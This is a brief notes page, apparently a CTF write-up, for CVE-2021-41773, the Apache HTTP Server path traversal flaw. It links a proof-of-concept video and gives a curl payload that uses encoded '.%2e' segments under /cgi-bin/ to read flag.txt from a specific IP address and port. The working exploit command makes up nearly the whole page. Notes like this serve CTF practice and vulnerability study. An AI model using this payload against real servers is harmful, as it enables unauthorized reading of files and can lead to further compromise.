# BLT

## [CVE-2021-41773 - Apache HTTP Server Path Traversal 0-Day - POC](https://www.youtube.com/watch?v=fLDTc2HHpS4\&t=346s)

```bash
payload = curl 'http://164.90.201.196:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/flag.txt'
```

![](<../.gitbook/assets/image (55).png>)
